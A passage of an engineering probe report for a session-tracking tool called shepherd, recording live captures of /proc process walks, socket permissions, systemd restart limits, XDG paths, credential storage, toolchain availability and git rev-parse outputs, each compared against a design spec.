- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh` (`docs/probes/2026-09-14-schemas/linux-process-git/sessiond_sim.py` joins SO_PEERCRED → /proc → registry per hook frame); `docs/probes/2026-09-14-schemas/linux-process-git/probe_print_registry.sh` (does `-p` register?). Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh && bash docs/probes/2026-09-14-schemas/linux-process-git/probe_print_registry.sh`
- **Status:** verified live 2026-09-14

**Real example** (full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-peercred.jsonl`, one frame from session C)
```json
{"peercred": {"pid": 4049200, "uid": 0, "gid": 0}, "walk": [{"pid": 4049200, "comm": "python3", "ppid": 4049199}, {"pid": 4049199, "comm": "sh", "ppid": 4049158}, {"pid": 4049158, "comm": "claude", "ppid": 4049157}], "claude_pid": 4049158, "claude_stat_starttime": 544014506, "claude_start_epoch_s": 1789402889.06, "registry": {"sessionId": "159b556e-eb7e-4cbe-b303-efcc8f5d08a5", "procStart": "544014506", "startedAt": 1789402898892, "pid": 4049158}, "walk_ms": 0.24, "payload_session_id": "159b556e-eb7e-4cbe-b303-efcc8f5d08a5", "payload_event": "SessionStart", "payload_bytes": 453}
```
A print-mode session's registry file (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-A-registry.json`)
```json
    "pid": 4048575,
    "sessionId": "bf3b6fd8-3e12-42de-b62a-02535a996554",
    "cwd": "/tmp/shp-lpg-proc.vpBd05/real/repo",
    "startedAt": 1789402841533,
    "procStart": "544009686",
...
    "kind": "interactive",
    "entrypoint": "sdk-cli",
...
    "tmux": "main:@0.%0",
    "messagingSocketPath": "/run/user/0/cc-socks/4048575.sock",
    "name": "repo-ce",
    "nameSource": "derived",
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| registry `pid` | number | always | = file name = `/proc` pid | |
| registry `procStart` | string | always | equals `/proc/<pid>/stat` field 22 in 24/24 frames (4 distinct processes) | Join key `(pid, procStart)` guards against pid reuse |
| registry `startedAt` | epoch ms | always | +0.67 s (A), +0.72 s (D), +9.83 s (C, time spent in the trust dialog) after `btime + starttime/100` | **Not process start**; roughly registration time |
| registry `sessionId` | uuid | always | = hook payload `session_id` in 24/24 | With `--resume` (B) the same id, new pid and new `procStart` |
| registry `kind` / `entrypoint` | string | always | `-p`: `interactive` / `sdk-cli` (6 files); TUI: `interactive` / `cli` | `kind` does not distinguish print mode |
| registry `tmux` | string | sometimes | `lpgprobe:@0.%0` (C); `main:@0.%0` for `-p` runs that inherited `TMUX` (A, `print-registry-*-inherited.json`); absent with `env -i` | **No socket name.** For A it names the launching session's pane, not a pane A owns |
| registry `bridgeSessionId` | string | sometimes | C only | |
| SO_PEERCRED walk | | always (24/24) | 0.22–1.04 ms | with hook waiting for a 1-byte ack |

**Variants and edge cases:**
- **Print-mode (`-p`) sessions DO write the registry file** in 2.1.270: 4/4 in `docs/probes/2026-09-14-schemas/linux-process-git/captures/print-registry.txt` (text and stream-json output, inherited and `env -i` env), plus A and D (`proc-meta.txt`, `proc-A-registry.json`, `proc-D-registry.json`) and B (`registry` non-null in `proc-peercred.jsonl`). The file is deleted on exit in 4/4 (`after_exit_registry_file=none`). This contradicts `docs/probes/2026-09-14-schemas/transcripts/SECTION.md` ("`-p` sessions never write one").
- In the recorded run the registry file was still present when the interactive session's `SessionEnd` hook connected (`proc-peercred.jsonl`, last line). An earlier run of the same probe, whose captures were overwritten and are **not** in evidence, saw `"registry": null` at that point. Treat the ordering as racy and do not read the registry at `SessionEnd`.
- A launcher's `tmux` can leak into the registry of a child session (A above), so the `tmux` field is not proof of ownership.

**Spec alignment:** the spec has no pid/registry linkage at all. Lines 926–927 (self-registration on the first turn) miss running-at-install sessions, as the transcripts surface already recorded (that behaviour was not re-probed here). This surface adds that `(pid, procStart)` is the stable key joining the hook env (`CLAUDE_PID`), `/proc` and the registry (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-peercred.jsonl`).

### Unix domain socket at mode 0600 + `SO_PEERCRED`

- **Produced by:** Linux 6.8 AF_UNIX via CPython 3.12.3 `socket`
- **Consumed by:** §5 line 312 (hookd→sessiond UDS 0600), §13 line 2044 ("Both Unix sockets at mode 0600"), §15 line 2219 (`$XDG_RUNTIME_DIR/shepherd/` mode 0700), D37, M1
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_socket.py`; live use in `docs/probes/2026-09-14-schemas/linux-process-git/sessiond_sim.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/linux-process-git/probe_socket.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/socket.txt`)
```text
## 1. file modes (stat)
srwxr-xr-x 755 socket root:root /tmp/shp-lpg-sock.mvu8empc/plain.sock
srw------- 600 socket root:root /tmp/shp-lpg-sock.mvu8empc/sessiond.sock
drwx------ 700 directory root:root /tmp/shp-lpg-sock.mvu8empc/shepherd
srw------- 600 socket root:root /tmp/shp-lpg-sock.mvu8empc/shepherd/sessiond.sock
...
## 2. SO_PEERCRED
getsockopt raw bytes: a3c53d000000000000000000 len 12
peer (pid, uid, gid): (4048291, 0, 0) | Popen child pid: 4048291 | match: True
socket.SO_PEERCRED constant: 17 | hasattr(socket,'SCM_CREDENTIALS'): True
peer exited BEFORE accept(): SO_PEERCRED pid = 4048292 | child pid: 4048292 | /proc/<pid> exists now: False

## 3. connect as uid nobody (runuser -u nobody)
plain.sock (umask 022 default): PermissionError [Errno 13] Permission denied
sessiond.sock (0600): PermissionError [Errno 13] Permission denied
0600 sock inside 0700 dir: PermissionError [Errno 13] Permission denied

## 4. sun_path length limit
path len 107 bytes: bind ok
path len 108 bytes: OSError: AF_UNIX path too long
...
connect as nobody to abstract name: connected
...
connect to stale path: ConnectionRefusedError: [Errno 111] Connection refused
re-bind same path without unlink: OSError: [Errno 98] Address already in use
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| socket mode | st_mode | always | umask 0177 at `bind()` → `srw-------` (0600); default umask 022 → 0755 | Set umask before `bind()`; there is no chmod window |
| `SO_PEERCRED` | 12 bytes `struct ucred {pid,uid,gid}` (`"3i"`) | always | pid matched the connecting child's pid | `socket.SO_PEERCRED == 17` |
| peer pid after the peer exited | int | always | still returned; `/proc/<pid>` gone | **Credentials are captured at `connect()`.** Walking `/proc` from them races the hook's exit |
| other-uid connect | errno | always | `EACCES` for 0600, 0755 (no `w`) and 0600-in-0700 | Connecting needs write permission on the socket inode |

**Variants and edge cases:**
- `sun_path` holds at most 107 bytes plus NUL. `/run/user/0/shepherd/sessiond.sock` is 34 bytes. A deep path like the evidence folder would fail.
- An abstract-namespace socket (`\0name`) has no file mode, and uid `nobody` connected to it. Do not use one.
- A stale socket file after a crash gives `ECONNREFUSED` to clients and `EADDRINUSE` on re-bind. sessiond must unlink before bind.
- In the live probe, a hook that waited for a 1-byte ack let the listener walk `/proc` in 0.22–1.04 ms (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-peercred.jsonl`), inside hookd's 250 ms budget (spec line 312).

**Spec alignment:** aligned. Spec line 2044 (sockets 0600) and line 2219 (dir 0700) are achievable and effective against another uid. Addition: the spec's hookd (lines 900–906) does not wait for any reply. A sessiond that wants `SO_PEERCRED` → `/proc` must read `/proc` before the hook exits, or rely on `CLAUDE_PID` carried in the frame.

### systemd user manager, transient unit `Restart=always`, and journal lines

- **Produced by:** systemd 255 (255.4-1ubuntu8.17), user manager `user@0.service`
- **Consumed by:** §15 lines 2209–2226 (two user units, `Restart=always`, linger), D39, §7 migrations line 860, M6 packaging (out of M1–M4 scope, but D39 constrains M1 daemons)
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_systemd_xdg.sh` (one transient unit, stopped and reset-failed; no unit files written; linger untouched). Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_systemd_xdg.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/systemd-xdg.txt`)
```text
## systemctl --user with XDG_RUNTIME_DIR and DBUS_SESSION_BUS_ADDRESS removed
Failed to connect to bus: No medium found
rc=1
...
## env -i systemctl --user --machine=root@.host
Failed to connect to bus: No medium found
rc=1

## env -i with XDG_RUNTIME_DIR=/run/user/$uid only
running
rc=0
...
Running as unit: shp-lpg-probe-1789402661.service; invocation ID: bb57f6bcfa4240bfb71dbd9e6930297a
systemd-run rc=0
t+01s MainPID=4047993 Result=success NRestarts=0 ExecMainStatus=0 ActiveState=active SubState=running 
t+02s MainPID=0 Result=exit-code NRestarts=0 ExecMainStatus=1 ActiveState=activating SubState=auto-restart 
t+03s MainPID=4048010 Result=success NRestarts=1 ExecMainStatus=0 ActiveState=active SubState=running 
...
t+10s MainPID=0 Result=exit-code NRestarts=5 ExecMainStatus=1 ActiveState=failed SubState=failed 
...
Restart=always
RestartUSec=500ms
...
StartLimitIntervalUSec=10s
StartLimitBurst=5
StartLimitAction=none
...
2026-09-14T16:17:41+00:00 finops-mitm-lab systemd[1014041]: Started shp-lpg-probe-1789402661.service - shepherd schema probe (throwaway).
2026-09-14T16:17:41+00:00 finops-mitm-lab (sh)[4047993]: shp-lpg-probe-1789402661.service: Invalid environment variable name evaluates to an empty string: DBUS_SESSION_BUS_ADDRESS-<unset>, XDG_CONFIG_HOME-<unset>, XDG_DATA_HOME-<unset>, XDG_RUNTIME_DIR-<unset>
...
2026-09-14T16:17:42+00:00 finops-mitm-lab systemd[1014041]: shp-lpg-probe-1789402661.service: Main process exited, code=exited, status=1/FAILURE
2026-09-14T16:17:42+00:00 finops-mitm-lab systemd[1014041]: shp-lpg-probe-1789402661.service: Failed with result 'exit-code'.
2026-09-14T16:17:42+00:00 finops-mitm-lab systemd[1014041]: shp-lpg-probe-1789402661.service: Scheduled restart job, restart counter is at 1.
...
2026-09-14T16:17:49+00:00 finops-mitm-lab systemd[1014041]: shp-lpg-probe-1789402661.service: Scheduled restart job, restart counter is at 5.
2026-09-14T16:17:49+00:00 finops-mitm-lab systemd[1014041]: shp-lpg-probe-1789402661.service: Start request repeated too quickly.
2026-09-14T16:17:49+00:00 finops-mitm-lab systemd[1014041]: shp-lpg-probe-1789402661.service: Failed with result 'exit-code'.
2026-09-14T16:17:49+00:00 finops-mitm-lab systemd[1014041]: Failed to start shp-lpg-probe-1789402661.service - shepherd schema probe (throwaway).
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `systemctl --user` reachability | exit code + stderr | always | works with inherited env; `No medium found` rc=1 without `XDG_RUNTIME_DIR` (also `env -i`, also `--machine=root@.host`); works with only `XDG_RUNTIME_DIR=/run/user/0` | The one variable that matters is `XDG_RUNTIME_DIR` |
| `show -p` states | `Key=Value` lines | always | `active/running` → `activating/auto-restart` → … → `failed/failed` | `NRestarts` counts up to 5 |
| `StartLimitBurst` / `StartLimitIntervalUSec` | defaults | always | `5` / `10s` | With `Restart=always` a crash loop ends in `failed` after 5 restarts in 10 s |
| journal lines | `journalctl --user -u` short-iso | always | `Started …`, `Main process exited, code=exited, status=1/FAILURE`, `Scheduled restart job, restart counter is at N.`, `Start request repeated too quickly.` | Unit stdout lines are tagged `sh[<pid>]`. `journalctl _SYSTEMD_USER_UNIT=` in the system view returned `-- No entries --` |
| transient unit file | path | always | `/run/user/0/systemd/transient/shp-lpg-probe-1789402661.service` | Gone after `stop` + `reset-failed` (`LoadState=not-found`) |
| unit env names | list | always | `DBUS_SESSION_BUS_ADDRESS … HOME INVOCATION_ID JOURNAL_STREAM … PATH PWD SHELL SSH_AUTH_SOCK SYSTEMD_EXEC_PID USER XDG_DATA_DIRS XDG_RUNTIME_DIR` | No `XDG_DATA_HOME`/`XDG_CONFIG_HOME`; `PWD=/root` |

**Variants and edge cases:**
- systemd expands `${VAR-…}` and `$$` inside `ExecStart=` itself, before `/bin/sh` runs: `start pid=$ XDG_RUNTIME_DIR= …` plus the "Invalid environment variable name" warning. A unit file that passes shell syntax must write `$${VAR}`.
- `~/.config/systemd/user` does not exist on this host yet.
- The user's live Remote Control claude processes run in `user@0.service/tmux-spawn-*.scope` cgroups, which belong to the user manager (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-A-snapshot.json` "others"). Not verified: what happens to them on logout with `Linger=no`. Logging out was not attempted.

**Spec alignment:**
- Spec lines 2215–2216 say `Restart=always`, and reality is that `Restart=always` alone gives up after 5 starts in 10 s: `Start request repeated too quickly.` → `failed` (`docs/probes/2026-09-14-schemas/linux-process-git/captures/systemd-xdg.txt`). The probe unit set `RestartSec=500ms` and exited 1 after about 1 s; the `StartLimitBurst=5` / `StartLimitIntervalUSec=10s` defaults were left unchanged. A daemon that crash-loops that fast ends in `failed` and is not restarted again. The spec should state the intended start-limit policy: `StartLimitIntervalSec=0` or a longer `RestartSec=` to keep retrying, or accept `failed`. For the migration refuse-to-start rules (spec lines 855–862), ending in `failed` may be the desired outcome, since it stops a futile loop. Either way, it is a choice the spec does not make.
- Spec lines 2223–2224 (`shepherd install` checks `loginctl`) are aligned. But `shepherd install` and any `systemctl --user` call fail with `Failed to connect to bus: No medium found` when `XDG_RUNTIME_DIR` is unset. This was observed with `env -u XDG_RUNTIME_DIR -u DBUS_SESSION_BUS_ADDRESS` and with `env -i`; cron, `su` and ssh command contexts were not probed. The spec does not mention this dependency.

### `loginctl show-user` (Linger)

- **Produced by:** systemd-logind 255
- **Consumed by:** §15 lines 2221–2226, D39 ("lingering required"), principle 4
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_systemd_xdg.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_systemd_xdg.sh`
- **Status:** verified live 2026-09-14 (read-only; linger was not changed)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/systemd-xdg.txt`)
```text
## loginctl
UID USER LINGER STATE
  0 root no     active

1 users listed.
UID=0
Name=root
RuntimePath=/run/user/0
Service=user@0.service
Slice=user-0.slice
State=active
Linger=no
linger dir: 
logind KillUserProcesses: #KillUserProcesses=no 
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `Linger` | `yes`/`no` | always | `no` | `/var/lib/systemd/linger/` is empty |
| `State` | enum | always | `active` | (`lingering` is the value with no login session but linger on; not observed) |
| `RuntimePath` | path | always | `/run/user/0` | tmpfs `mode=700`, `size=391156k` |
| `Service` | unit | always | `user@0.service` | |
| `KillUserProcesses` | logind.conf | always | commented default `no` | Login-scope processes survive logout; the user manager itself does not without linger |

**Variants and edge cases:** `-p Name -p UID …` output order follows systemd's order, not the order of the `-p` arguments (`UID` printed before `Name`).

**Spec alignment:** aligned. Linger is off on the target host, exactly the case spec lines 2221–2226 guard against. `shepherd install` will have to prompt.

### XDG base directories (this shell vs systemd user manager)

- **Produced by:** pam_systemd / ssh login session; systemd 255 user manager
- **Consumed by:** §15 lines 2213–2219, §7 logs line 830 (`$XDG_DATA_HOME/shepherd`), §13 line 2049 (`$XDG_CONFIG_HOME/shepherd/`), D39, M1 (daemons create these dirs)
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_systemd_xdg.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_systemd_xdg.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/systemd-xdg.txt`)
```text
## this shell: XDG values
XDG_RUNTIME_DIR=/run/user/0
XDG_DATA_HOME=<unset>
XDG_CONFIG_HOME=<unset>
XDG_STATE_HOME=<unset>
XDG_CACHE_HOME=<unset>
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus
XDG_SESSION_ID=10905
XDG_SESSION_CLASS=user
shell_is_login: no
...
XDG_DATA_HOME -> /root/.local/share (default)
XDG_CONFIG_HOME -> /root/.config (default)
XDG_RUNTIME_DIR -> /run/user/0
...
## user manager environment (names; XDG_*/DBUS values)
...
XDG_RUNTIME_DIR=/run/user/0
XDG_DATA_DIRS=/usr/local/share/:/usr/share/:/var/lib/snapd/desktop
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `XDG_DATA_HOME` | path | never (shell, user manager, unit) | | Must default to `~/.local/share` |
| `XDG_CONFIG_HOME` | path | never | | Must default to `~/.config` |
| `XDG_STATE_HOME`, `XDG_CACHE_HOME` | path | never | | |
| `XDG_RUNTIME_DIR` | path | shell: yes; user manager: yes; unit env: yes; hook env: yes (`/run/user/0`); `env -i`: no | `/run/user/0` | No default exists. Claude Code uses it as well (registry `messagingSocketPath: /run/user/0/cc-socks/<pid>.sock`) |
| `DBUS_SESSION_BUS_ADDRESS` | string | shell, user manager, unit | `unix:path=/run/user/0/bus` | |

**Variants and edge cases:**
- This shell is a non-login shell, yet it has `XDG_RUNTIME_DIR` because it inherits from an ssh login session (`XDG_SESSION_ID=10905`). A claude launched with a scrubbed environment would presumably not pass it to hookd. This is inferred and was not provoked: all 24 captured hook envs had `XDG_RUNTIME_DIR=/run/user/0`, including session D, because the `env -i` launch passed it explicitly.
- `/run/user/0` is a tmpfs that logind creates per user. Without linger it is removed when the last session ends, which also removes any socket placed in it. Inferred from logind docs, not provoked here.

**Spec alignment:** spec lines 2217–2219 are aligned for the data and config paths, as long as the implementation applies the XDG defaults, because neither variable is ever set on this host. Line 2219 (`$XDG_RUNTIME_DIR/shepherd/`): hookd runs inside the claude process's environment, not under systemd. hookd should derive `/run/user/<uid>` when `XDG_RUNTIME_DIR` is absent, otherwise it cannot find the socket. The spec gives no fallback (`docs/probes/2026-09-14-schemas/linux-process-git/captures/systemd-xdg.txt`, `env -i` case). The hookd failure itself is inferred and was not observed (see the edge case above).

### Credential store availability (Secret Service vs 0600 file)

- **Produced by:** host packages / D-Bus session bus (dbus-daemon, `busctl`)
- **Consumed by:** §13 line 2049 ("Which one this host has is recorded in data-schemas.md"), D2/D39 `Credentials` seam, M4 (credential_ref), M4.5
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_secrets_runtime.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_secrets_runtime.sh`
- **Status:** partially verified. Availability was verified live 2026-09-14: this host has no Secret Service, and the 0600-file fallback works. The Secret Service driver path (`secret-tool` store/lookup/clear, locked collection under a headless user service) is not verifiable here, because no keyring is installed and nothing was installed.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/secrets-runtime.txt`)
```text
secret-tool                  <not found>
gnome-keyring-daemon         <not found>
kwalletd5                    <not found>
kwalletd6                    <not found>
...
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus
srw-rw-rw- 1 root root 0 Jul 27 14:55 /run/user/0/bus
...
$ busctl --user list | grep -i -E 'secret|keyring|kwallet'
<no secret/keyring/kwallet names on the session bus, including activatable>
$ busctl --user call org.freedesktop.secrets /org/freedesktop/secrets org.freedesktop.DBus.Peer Ping
Call failed: The name org.freedesktop.secrets was not provided by any .service files
[rc=1]
...
store/lookup round trip: SKIPPED (secret-tool absent or no org.freedesktop.secrets on the session bus)
...
drwx------ 700 root:root <tmpdir>/shepherd
-rw------- 600 root:root <tmpdir>/shepherd/credentials.json
nobody read: cat: <tmpdir>/shepherd/credentials.json: Permission denied
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `secret-tool` (libsecret-tools) | binary | never | not installed | |
| keyring daemons | binary | never | gnome-keyring, kwalletd5/6, pass, keyctl: none | |
| D-Bus session bus | socket | always | `/run/user/0/bus`, owned by the user manager (PID 1014041) | |
| `org.freedesktop.secrets` | bus name | never | not owned and not activatable | |
| Python `secretstorage` / `keyring` | module | never | `ModuleNotFoundError` | |
| 0600 file fallback | file mode | always | `-rw-------` in a `drwx------` dir; `nobody` denied | |

**Variants and edge cases:** not verified: a host that has gnome-keyring. Under a systemd user service with no graphical login, the default collection is normally locked. Nothing here could exercise that.

**Spec alignment:** aligned. Spec line 2049's fallback is the driver this host needs: **this host has no Secret Service; `Credentials` uses the mode-0600 file under `$XDG_CONFIG_HOME/shepherd/` (defaulting to `~/.config/shepherd/`)**.

### Runtime toolchain (Python, SQLite, venv/pip, Node/TypeScript)

- **Produced by:** Ubuntu 24.04.4 packages on this host
- **Consumed by:** §5 Stack lines 404–411 (Python 3.12, SQLite WAL, `claude-agent-sdk`, `tsc`), principle 6 line 168 (`mypy --strict`), §7 line 570 ("a raw `sqlite3` shell"), §15 line 2209 (`shepherd install` creates a venv), D26, M1–M4
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_secrets_runtime.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_secrets_runtime.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/secrets-runtime.txt`)
```text
python3                      /usr/bin/python3
Python 3.12.3
...
sqlite3.sqlite_version: 3.45.1
journal_mode=WAL: [('wal',)]
json1 json_extract: [(2,)]
jsonb (3.45+): [('blob',)]
CHECK enum: []
STRICT table (3.37+): []
RETURNING (3.35+): [(1, 'running')]
conditional UPDATE rowcount path: [(1,)]
compile_options (FTS5/JSON): [('ENABLE_FTS5',), ('THREADSAFE=1',)]
$ sqlite3 (CLI)
sqlite3                      <not found>
$ python3 -m pip --version
/usr/bin/python3: No module named pip
[rc=1]
...
$ python3 -m venv <tmp>/with-pip
The virtual environment was not created successfully because ensurepip is not
available.  On Debian/Ubuntu systems, you need to install the python3-venv
package using the following command.
...
[rc=1]
$ python3 -m venv --without-pip <tmp>/nopip
[rc=0]
...
node                         <not found>
nodejs                       <not found>
npm                          <not found>
npx                          <not found>
tsc                          <not found>
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| Python | version | always | 3.12.3 (`/usr/bin/python3 -> python3.12`); no 3.11/3.13 | matches spec |
| SQLite (Python module) | version | always | 3.45.1; WAL, JSON1, `jsonb`, STRICT, RETURNING, FTS5 all work | |
| `sqlite3` CLI | binary | never | | |
| pip / ensurepip | module | never | `No module named pip` / `ensurepip` | `python3-venv`, `python3.12-venv`, `python3-pip` not installed |
| `venv` | stdlib | sometimes | fails with pip (rc=1); `--without-pip` rc=0 | |
| pipx / uv / virtualenv / mypy | binary | never | | |
| node / npm / npx / tsc / corepack / bun / deno | binary | never | also absent in a login shell | `claude` is a 223,981,040-byte ELF (bundled runtime, no system node) |
| tmux / git | version | always | tmux 3.4, git 2.43.0 | |

**Variants and edge cases:** none beyond the table. Nothing was installed.

**Spec alignment:**
- Spec line 2209 says "`shepherd install` creates a venv", and reality is that `python3 -m venv` fails on this host (no `ensurepip`). Only `--without-pip` works, and then nothing can install `claude-agent-sdk` (spec line 406) without apt `python3.12-venv` or a bootstrap (`docs/probes/2026-09-14-schemas/linux-process-git/captures/secrets-runtime.txt`).
- Spec line 411 says "no bundler beyond `tsc`", and reality is that no node, npm or tsc is installed. The frontend cannot be built on this host as-is. The spec does not say whether the build runs on the target host or ships prebuilt JS, so this is an unstated host prerequisite rather than a contradiction.
- Host notes, not spec misalignments: `mypy` (principle 6, line 168) is not installed. That is a development tool, and it becomes installable once the venv/pip gap above is fixed. There is also no `sqlite3` CLI. Line 570 is a readability rationale for TEXT enums and does not require the CLI. The stdlib `python3 -m sqlite3` shell exists in 3.12, but that was not captured here. SQLite features for §7 (WAL, CHECK, JSON, STRICT, RETURNING) are aligned.

### `git rev-parse` outputs for cwd → repo binding

- **Produced by:** git 2.43.0
- **Consumed by:** §7 `repo.root_path` line 632 ("absolute, canonicalized, UNIQUE. The longest-prefix key"), `workspace.root_path` line 621 (`discover_repos`), §8 line 881, §13 line 2113, D22, M1 (discovery and binding)
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh` (throwaway repos in `mktemp -d`; read-only on `/root/Shepherd`, `/root/src/cc10x-qa`). Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh`
- **Status:** verified live 2026-09-14
- **A note on the name `PROJ-1`.** This capture is **not byte-for-byte what the
  command printed.** One ticket-shaped identifier — the branch and worktree name
  the probe created under `mktemp -d` — was substituted on 2026-09-20 at the
  owner's instruction, because the original carried a former employer's project
  prefix. **Nothing else in this capture was touched**: the paths, the ordering,
  the `rc=` codes and every other byte are as git produced them.
  `docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh` was renamed to
  match, so **re-running the probe reproduces exactly what is written here** —
  which is the property that makes this evidence rather than illustration. Said
  plainly because a sanitised capture that does not admit it is a fabricated
  one.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt`)
```text
$ git -C /root/Shepherd rev-parse --show-toplevel --git-common-dir --git-dir --is-bare-repository --is-inside-work-tree
/root/Shepherd
.git
.git
false
true
[rc=0]
...
$ git -C /root/Shepherd/docs/specs rev-parse --show-toplevel --show-prefix --git-common-dir
/root/Shepherd
docs/specs/
../../.git
[rc=0]
...
$ (cd /tmp/shp-lpg-git.YD7ktR/main-wt/PROJ-1/src) git rev-parse --path-format=absolute --show-toplevel --git-common-dir --git-dir
/tmp/shp-lpg-git.YD7ktR/main-wt/PROJ-1
/tmp/shp-lpg-git.YD7ktR/main/.git
/tmp/shp-lpg-git.YD7ktR/main/.git/worktrees/PROJ-1
[rc=0]
...
$ git -C /tmp/shp-lpg-git.YD7ktR/bare.git rev-parse --show-toplevel
fatal: this operation must be run in a work tree
[rc=128]
...
$ git -C /tmp/shp-lpg-git.YD7ktR/plain/dir rev-parse --show-toplevel
fatal: not a git repository (or any of the parent directories): .git
[rc=128]
...
$ (cd /tmp/shp-lpg-git.YD7ktR/main/vendor/inner/deep) git rev-parse --show-toplevel --show-superproject-working-tree
/tmp/shp-lpg-git.YD7ktR/main/vendor/inner
[rc=0]
...
$ (cd /tmp/shp-lpg-git.YD7ktR/main/mods/sub) git rev-parse --show-toplevel --show-superproject-working-tree --path-format=absolute --git-common-dir
/tmp/shp-lpg-git.YD7ktR/main/mods/sub
/tmp/shp-lpg-git.YD7ktR/main
/tmp/shp-lpg-git.YD7ktR/main/.git/modules/mods/sub
[rc=0]
...
$ (cd /tmp/shp-lpg-git.YD7ktR/link-to-main/src) git rev-parse --show-toplevel --show-cdup
/tmp/shp-lpg-git.YD7ktR/main
../
[rc=0]
...
$ git -C /tmp/shp-lpg-git.YD7ktR/foreign rev-parse --show-toplevel
fatal: detected dubious ownership in repository at '/tmp/shp-lpg-git.YD7ktR/foreign'
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `--show-toplevel` | abs path, one line | sometimes | work tree root, **physical path** (symlink resolved) | rc=128 in a bare repo, inside `.git`, outside a repo, or on dubious ownership |
| `--git-common-dir` | path | always in a repo | **relative** by default (`.git`, `../../.git`); absolute in a linked worktree (`…/main/.git`) | Use `--path-format=absolute` (git ≥ 2.31) |
| `--git-dir` | path | always in a repo | `.git` at the root; absolute `…/main/.git` from a subdir (`src/pkg`); `…/main/.git/worktrees/PROJ-1` in a worktree; `…/.git/modules/mods/sub` in a submodule | Relative or absolute depending on cwd; use `--path-format=absolute` |
| `--show-prefix` | rel path + `/` | always in a work tree | `docs/specs/`, `src/pkg/` | |
| `--show-superproject-working-tree` | abs path or empty | sometimes | submodule → `…/main`; nested plain repo → no line | A nested non-submodule repo does not know its parent |
| `--is-bare-repository` | `true`/`false` | always | | |
| multi-flag output | one line per flag, in flag order | always | | Empty values print no line, so line position is not stable |

**Variants and edge cases:**
- Nested repo: innermost toplevel wins (`…/main/vendor/inner`). The outer repo sees it as untracked `?? vendor/`.
- Symlink: running from `…/link-to-main/src` returns `…/main`, the same physical form Claude Code puts in hook `cwd` and `/proc/<pid>/cwd` (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-cwd-forms.txt`: `rev-parse --show-toplevel (from logical cwd): /tmp/shp-lpg-proc.vpBd05/real/repo`).
- A repo owned by another uid fails with `detected dubious ownership` rc=128 unless `-c safe.directory=<path>` is given.
- No commits: `rev-parse HEAD` rc=128 while `--show-toplevel` works.

**Spec alignment:**
- Spec line 632 ("canonicalized") is aligned if canonicalization is `realpath`. Hook `cwd`, `/proc` cwd and `rev-parse` all return physical paths. Only `PWD` is logical (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-hooks.jsonl`).
- D22 (line 126, "resolves nested repos to the innermost") matches git's own behavior (aligned).
- Mismatch: D22 binds a session by longest-prefix of `cwd` against registered `root_path`s. A linked worktree reports `--show-toplevel` = the worktree path and lives outside the repo root. The spec's own layout (line 1374, `<repo>-wt/<KEY>/`, a **sibling** of `<repo>`) never prefix-matches, so a worker session in a worktree gets `repo_id = null`. `--git-common-dir --path-format=absolute` (→ `<repo>/.git`) is the key that maps a worktree back to its repo (`docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt` §D). This bites M1 as soon as a user runs claude in a hand-made worktree, before M5 creates any. The spec is also internally inconsistent here: Appendix A (lines 2426 and 2431) shows a queue-worker session with `repo_id: rep_b2` (`billing-api`) and `cwd: …/billing-api-wt/PROJ-81711`, a binding that longest-prefix matching cannot produce. An owned session could have `repo_id` set at spawn, but `repos_touched` (§7, from `FileChanged` paths) and attached sessions have no such escape.

### `git remote get-url` forms (`repo.vcs_remote`)

- **Produced by:** git 2.43.0
- **Consumed by:** §7 `repo.vcs_remote` line 633 ("null for non-git"), Appendix A line 2408, §13 redaction lines 2052–2053, D22, M1
